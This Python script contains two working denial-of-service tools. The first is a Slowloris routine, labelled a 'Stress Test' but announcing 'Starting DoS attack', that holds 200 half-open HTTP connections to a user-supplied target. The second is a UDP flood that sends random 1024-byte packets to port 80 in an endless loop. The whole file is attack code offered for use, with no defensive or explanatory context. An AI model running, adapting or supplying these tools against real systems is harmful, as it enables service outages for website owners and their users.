import socket
import random
import time
import sys

def slwlrs():
    try:
        print('  Slowloris Stress Test')
        ip = input('  set target> ')
        headers = [
            "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Accept-language: en-US,en"
        ]

        sockets = []

        def setupSocket(ip):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((ip, 80))
            sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))

            for header in headers:
                sock.send("{}\r\n".format(header).encode("utf-8"))

            return sock

        if __name__ == "__main__":

            count = 200
            print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))

            for _ in range(count):
                try:
                    print("Socket {}".format(_))
                    sock = setupSocket(ip)
                except socket.error:
                    break

                sockets.append(sock)

            while True:
                print("Connected to {} sockets. Sending headers...".format(len(sockets)))

                for sock in list(sockets):
                    try:
                        sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
                    except socket.error:
                        sockets.remove(sock)

                for _ in range(count - len(sockets)):
                    print("Re-opening closed sockets...")
                    try:
                        sock = setupSocket(ip)
                        if sock:
                            sockets.append(sock)
                    except socket.error:
                        break

                time.sleep(15)
    except KeyboardInterrupt:
        exit()


def udpflood():

    con = 1

    print("  UDP Flood")
    dest_ip = input("  set Host> ")
    dest_port = 80

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    packet = random._urandom(1024)
    print("  Port ", dest_port)
    print("  [\033[1;32mOK\033[0;0m]-Starting send packets...")

    while True:
        sock.sendto(packet, (dest_ip, dest_port))
        con = con + 1
        print("  ",con, end="\r")
        #time.sleep(0.1)
